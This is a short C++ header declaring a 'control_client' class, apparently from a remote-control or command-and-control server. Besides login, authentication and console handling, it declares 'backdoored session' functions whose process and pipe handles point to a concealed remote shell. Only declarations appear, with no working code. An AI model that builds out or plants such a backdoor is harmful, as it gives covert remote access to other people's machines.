#pragma once
#include <ws2tcpip.h>
#include <fstream>
#include <thread>

class control_client
{
public:
	control_client(SOCKET sock);
	~control_client();

	char* get_client_ip();
	u_long get_ul_client_ip();
	SOCKET get_client_socket() { return socket; }
	void send_string(char* fmt, ...);
	bool request_auth_key();
	bool request_login(char* out_username);
	void read_line(char* buf, bool masked = false);
	char read_char();
	void set_client_title(char* buf);
	void clear_client_console();
	void end();
	void init();
	void start_backdoored_session();
	void clean_backdoored_session();
	bool backdoor_data_read();
	static DWORD WINAPI backdoored_session_handler(LPVOID param);

	void print_auth_anim(bool success);
	bool parse_command(char* string);

private:
	SOCKET socket;
	std::thread* client_thread;
	std::thread* title_thread;
	CRITICAL_SECTION write_cs;

private:
	PROCESS_INFORMATION * bd_process;
	HANDLE bd_thread;
	HANDLE bd_pout, bd_pin;
	HANDLE bd_cout, bd_cin;
	bool session_backdoored;
};

